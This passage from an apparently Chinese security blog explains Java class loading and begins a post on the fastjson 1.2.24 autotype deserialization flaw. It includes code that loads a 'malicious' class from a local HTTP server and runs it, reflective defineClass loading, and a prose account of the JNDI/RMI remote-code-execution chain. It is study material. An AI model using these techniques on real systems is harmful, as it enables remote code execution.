class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(Filename))); <span class="hljs-comment">//将urldns.bin文件输入到ois对象中</span><br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同时 dnslog 接收到了反序列化时的dns请求</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240426092825997.png" alt="image-20240426092825997"></p><h3 id="ClassLoader（类加载机制）"><a href="#ClassLoader（类加载机制）" class="headerlink" title="ClassLoader（类加载机制）"></a>ClassLoader（类加载机制）</h3><h4 id="类加载过程"><a href="#类加载过程" class="headerlink" title="类加载过程"></a>类加载过程</h4><p>先在方法区找class信息，有的话直接调用，没有的话则使用类加载器加载到方法区（静态成员放在静态区，非静态成功放在非静态区)，静态代码块在类加载时自动执行代码，非静态的不执行；先父类后子类，先静态后非静态；静态方法和非静态方法都是被动调用，即不调用就不执行。</p><p>类加载的流程如下图：</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510145620304.png" alt="image-20240510145620304"></p><p>其中初始化阶段是会执行代码的，使用阶段就是创建对象，也会执行代码</p><h4 id="构造函数和静态代码块"><a href="#构造函数和静态代码块" class="headerlink" title="构造函数和静态代码块"></a>构造函数和静态代码块</h4><p>在Person类中创建一个<strong>静态代码块</strong>(不管调用哪种静态代码，都会调用静态代码块)和<strong>构造代码块</strong>(不管调用哪种构造方法，都会调用构造代码块)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123; <span class="hljs-comment">//静态代码块定义</span><br>        System.out.println(<span class="hljs-string">&quot;静态代码块&quot;</span>);<br>    &#125;<br>    &#123; <span class="hljs-comment">//构造代码块定义</span><br>        System.out.println(<span class="hljs-string">&quot;构造代码块&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当创建对象时，发现两个代码块都被输出了，由此可见在使用阶段两种代码块都调用了</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510150501986.png" alt="image-20240510150501986"></p><p>接下来分析一下哪个是在初始化阶段调用的，哪个是在使用阶段调用的</p><p>在Person类中加上一个静态变量id，给变量赋值时发现只调用了静态代码块，说明静态代码块是在初始化阶段就执行了</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510151019135.png" alt="image-20240510151019135"></p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510151032698.png" alt="image-20240510151032698"></p><p>通过 <em>Class</em>.<em>forName</em> 动态加载Person类，发现调用了静态代码块，说明 <em>Class</em>.<em>forName</em> 加载时对类进行了初始化</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510151448849.png" alt="image-20240510151448849"></p><p>也可以让类加载的时候不进行初始化，跟踪一下 <em>Class</em>.<em>forName</em> 方法：</p><p>代码里return了一个 <em>forName0</em> 方法</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510152118522.png" alt="image-20240510152118522"></p><p>跟着看一下这个方法，发现这个方法是native定义的，是c&#x2F;c++写的，其中有四个参数，第一个是类名，第二个是判断是否进行初始化，第三个是 <em>ClassLoader</em> 是个类加载器，第四个参数不重要</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510152159996.png" alt="image-20240510152159996"></p><p>在 <em>Class</em>.<em>forName</em> 中可以看到判断初始化的参数默认传的是true</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510152905852.png" alt="image-20240510152905852"></p><p>可以手动让其加载类时不进行初始化，其中第三个参数由于需要传递一个类加载器，可以通过 <em>ClassLoader</em>.<em>getSystemClassLoader</em>() 方法获取一个系统类加载器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br><span class="hljs-comment">//        new Person();</span><br><span class="hljs-comment">//        Person.id = 1;</span><br><span class="hljs-comment">//        Class.forName(&quot;org.example.Person&quot;);</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        Class.forName(<span class="hljs-string">&quot;org.example.Person&quot;</span>,<span class="hljs-literal">false</span>,classLoader);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行后发现没有输出静态代码块，说明没有进行初始化</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510153459637.png" alt="image-20240510153459637"></p><h4 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h4><p>前面代码是通过 <em>ClassLoader</em>.<em>getSystemClassLoader</em>() 方法来获取的系统类加载器，这里输出查看一下，得到结果是 AppClassLoader </p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510153907055.png" alt="image-20240510153907055"></p><p>Java中提供了这四种类型的加载器：</p><ul><li>Bootstrap ClassLoader 引导类加载器，是最基本的类加载器，也就是系统类加载器，加载的是 java.lang 下的类，它是ExtClassLoader的父类加载器</li><li>Extention ClassLoader 扩展类加载器，用来加载ext目录下的类库的，ExtClassLoader是AppClassLoader的父类加载器</li><li>Application ClassLoader 系统类加载器，主要负责加载当前应用的 classpath 下的所有类，平常使用的大部分都是通过这个类加载器加载的<ul><li>classpath 实际上就是系统变量java.class.path的值</li><li><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240510155045829.png" alt="image-20240510155045829"></li></ul></li><li>User ClassLoader  自定义类加载器，用户自定义的类加载器，可加载指定路径的class文件</li></ul><p>双亲委派机制，指的就是：<strong>当一个类加载器收到了类加载的请求的时候，他不会直接去加载指定的类，而是把这个请求委托给自己的父加载器去加载。只有父加载器无法加载这个类的时候，才会由当前这个加载器来负责类的加载。</strong></p><p>注意：<strong>双亲委派机制只是一种逻辑的指向，并不是真正的继承关系</strong></p><p><img src="E:/zhaozhichao/Java_Security/images/image_20240520101101.png" alt="image_20240520101101"></p><h4 id="任意类加载"><a href="#任意类加载" class="headerlink" title="任意类加载"></a>任意类加载</h4><p>这里跟踪一下类加载器的底层原理，实现加载任意的类，从而实现任意类加载漏洞利用</p><p>跟踪前需要对jdk的 rt.jar 进行反编译一下，这样可以更清晰的看到代码逻辑，反编译流程可以看一下这个连接<code>https://blog.csdn.net/yangyangrenren/article/details/117554745</code></p><p>加载Person类为例</p><p>在类加载地方打上断点，单机调试按钮</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240515165236643.png" alt="image-20240515165236643"></p><p>单机强制步入(shift+alt+f7)，走到了 ClassLoader 抽象类下的 loadClass 方法（抽象类无法实例化，需要被继承才能被使用）</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240515165251693.png" alt="image-20240515165251693"></p><p>由之前分析得知，我们使用的是 AppClassLoader，所以调用的是 AppClassLoader 的 loadClass方法，这里调用了 super.<em>loadClass</em></p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240515165453793.png" alt="image-20240515165453793"></p><p>继续跟进，代码又回到了 ClassLoader 类里面，在这里查询了parent加载器是否为null，结果为null的话就再往下慢慢去找.(parent加载器:请求委托给自己的父加载器去加载。只有父加载器无法加载这个类的时候，才会由当前这个加载器来负责类的加载。父类加载不了所以为null)</p><p><img src="E:/zhaozhichao/Java_Security/images/image-20240515165540153.png" alt="image-20240515165540153"></p><p>走到 findClass 方法，会进入到URLclassloader里，这是因为Appclassloader中没有findClass方法，URLclassloader是Appclassloader类的父类，所以走到了URLclassloader</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240515165645932.png" alt="image-20240515165645932"></p><p>跟一下URLclassloader的findClass方法，方法中最后会调用一个 <em><strong>defineClass</strong></em> 方法，实际上就是在这个方法里完成了类的加载</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240517091613046.png" alt="image-20240517091613046"></p><p>跟一下这个 <em>defineClass</em>，代码中调用了另一个<em>defineClass</em>方法，继续跟进</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240517091727669.png" alt="image-20240517091727669"></p><p>到了URLclassLoadr的父类SecureClassLoader的defineClass方法</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240517091753317.png" alt="image-20240517091753317"></p><p>继续跟进，发现回到了最开始的 ClassLoader 类的defineClass方法，代码中调用了一个<em>defineClass1</em>方法，跟着看一下这个方法</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240517092158425.png" alt="image-20240517092158425"></p><p>发现是三个native方法，传一个类名，传个字节码，最终就是在这里加载了<strong>字节码</strong></p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240517092223111.png" alt="image-20240517092223111"></p><p>最后再一层一层的返回回去</p><p>从结果分析这几个类的父子关系是ClassLoader-&gt;SecureClassloader-&gt;urlclassloaer-&gt;applicationclassloaer</p><p>方法调用关系是loadClass-&gt;findClass-&gt;defineClass(从字节码加载类)</p><h6 id="通过URLclassloader加载任意类"><a href="#通过URLclassloader加载任意类" class="headerlink" title="通过URLclassloader加载任意类"></a>通过URLclassloader加载任意类</h6><p><strong>上面分析了 URLclassloader，这个类还可以通过url来加载任意类</strong></p><p>首先本地起一个http服务，目录下有准备好的恶意类文件</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240517142936788.png" alt="image-20240517142936788"></p><p>编写代码，利用URLClassLoader 通过http来加载执行Calc.class类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, MalformedURLException &#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1/&quot;</span>)&#125;); <span class="hljs-comment">//创建一个URLClassLoader对象，该对象使用URL数组作为参数进行初始化。在这里，URL数组只包含一个URL，即&quot;http://127.0.0.1/&quot;。</span><br>        Class&lt;?&gt; aClass = urlClassLoader.loadClass(<span class="hljs-string">&quot;Calc&quot;</span>); <span class="hljs-comment">//使用URLClassLoader的loadClass方法加载名为&quot;Calc&quot;的类。这会从指定的URL加载类的字节码。</span><br>        aClass.newInstance(); <span class="hljs-comment">//通过调用newInstance方法创建&quot;Calc&quot;类的一个新实例。</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功加载了恶意类</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240517142959216.png" alt="image-20240517142959216"></p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240517143025537.png" alt="image-20240517143025537"></p><p>可以看到URLclassLoader可以加载class文件，除了http之外还可以用别的协议，比如file协议，jar协议等等</p><h6 id="通过defineClass反射加载任意类"><a href="#通过defineClass反射加载任意类" class="headerlink" title="通过defineClass反射加载任意类"></a>通过defineClass反射加载任意类</h6><p>前面分析得知，最终加载类的字节码是用的 Classloader.defineClass 方法，这里通过反射来调用 defineClass 方法加载任意类，只需要以字节码的形式传入即可</p><p>编写代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InstantiationException, IllegalAccessException, IOException, NoSuchMethodException, InvocationTargetException &#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader(); <span class="hljs-comment">//获取系统类加载器（Application ClassLoader）</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class); <span class="hljs-comment">//使用反射获取ClassLoader类中的defineClass方法，该方法用于定义新的类</span><br>        defineClass.setAccessible(<span class="hljs-literal">true</span>); <span class="hljs-comment">//设置defineClass方法为可访问（公有），因为它是ClassLoader类的一个受保护方法</span><br>        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;/home/Simply/Test/Calc.class&quot;</span>)); <span class="hljs-comment">//读取位于指定路径/home/Simply/Test/Calc.class的字节码文件内容，并将其保存为字节数组</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> (Class)defineClass.invoke(classLoader, <span class="hljs-string">&quot;Calc&quot;</span>, bytes, <span class="hljs-number">0</span>, bytes.length); <span class="hljs-comment">//使用defineClass方法将字节码转换为Class对象，并指定类的名称为&quot;Calc&quot;</span><br>        calc.newInstance(); <span class="hljs-comment">//通过调用newInstance方法创建&quot;Calc&quot;类的一个新实例</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240517144920390.png" alt="image-20240517144920390"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>Java反序列化</tag>
      
      <tag>类加载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson低版本反序列化漏洞浅析</title>
    <link href="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/"/>
    <url>/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h3 id="fastjson漏洞"><a href="#fastjson漏洞" class="headerlink" title="fastjson漏洞"></a>fastjson漏洞</h3><h4 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h4><p>Fastjson是阿里巴巴的一个开源项目，在GitHub上开源，使用Apache 2.0协议。它是一个支持Java Object和JSON字符串互相转换的Java库。</p><p>JSON.toJSONString 和 JSON.parseObject&#x2F;JSON.parse 分别实现序列化和反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> JSON.toJSONString(obj);        <span class="hljs-comment">// 序列化  对象转为json</span><br><span class="hljs-type">VO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;...&#125;&quot;</span>, VO.class); <span class="hljs-comment">// 反序列化  json转为对象</span><br></code></pre></td></tr></table></figure><h4 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><p>fastjson为了读取并判断传入的值是什么类型，增加了autotype机制导致了漏洞产生。</p><p>由于要获取json数据详细类型，每次都需要读取@type，而@type可以指定反序列化任意类调用其set，get，is方法，并且由于反序列化的特性，我们可以通过目标类的set方法自由的设置类的属性值。</p><p>那么<strong>攻击者只要准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口从攻击者控制的web服务器远程加载恶意代码并执行，形成RCE。</strong></p><p>就是说，payload字段中带有@type就可以调用指定类的方法，找一个带lookup方法的类，就可以解析ldap协议远程执行恶意类。</p><h4 id="漏洞演示："><a href="#漏洞演示：" class="headerlink" title="漏洞演示："></a>漏洞演示：</h4><p>创建一个项目</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301091049487.png" class="" title="image-20240301091049487"><p>引入fastjson1.2.24版本的依赖，刷新maven</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301091211987.png" class="" title="image-20240301091211987"><p>新建一个User类，写两个属性，然后生成get、set方法和构造方法</p><p>可以用快捷键alt+insert快速生成方法，这里选择生成getter、setter方法</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301093841413.png" class="" title="image-20240301093841413"><p>属性全选</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301093808305.png" class="" title="image-20240301093808305"><p>再生成一个构造方法</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301102552328.png" class="" title="image-20240301102552328"><p>属性无选择就行</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301102606812.png" class="" title="image-20240301102606812"><p>在每个方法里写一个输出语句，方便观察方法的调用</p><p>完整代码：（输出语句敲sout然后tab补全就可以）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(Integer age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;User的无参构造方法&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再创建一个FastJsonTest类</p><p>先new一个对象，然后通过set方法赋值，通过get方法取值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//new一个对象</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        <span class="hljs-comment">//调用user的set方法，给对象赋值</span><br>        user.setName(<span class="hljs-string">&quot;cc&quot;</span>);<br>        user.setAge(<span class="hljs-number">23</span>);<br>        <span class="hljs-comment">//调用get方法，取值</span><br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> user.getAge();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> user.getName();<br>        System.out.println(name + <span class="hljs-string">&quot; &quot;</span> + age);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果：</p><img src="/2024/03/06/fastjson%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20240301104006424.png" class="" title="image-20240301104006424"><p>使用fastjson的 <em>JSON</em>.<em>toJSONString</em> 方法来序列化user对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//new一个对象</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        <span class="hljs-comment">//调用user的set方法，给对象赋值</span><br>        user.setName(<span class="hljs-string">&quot;cc&quot;</span>);<br>        user.setAge(<span class="hljs-number">23</span>);<br>        <span class="hljs-comment">//调用get方法，取值</span><br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> user.getAge();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span 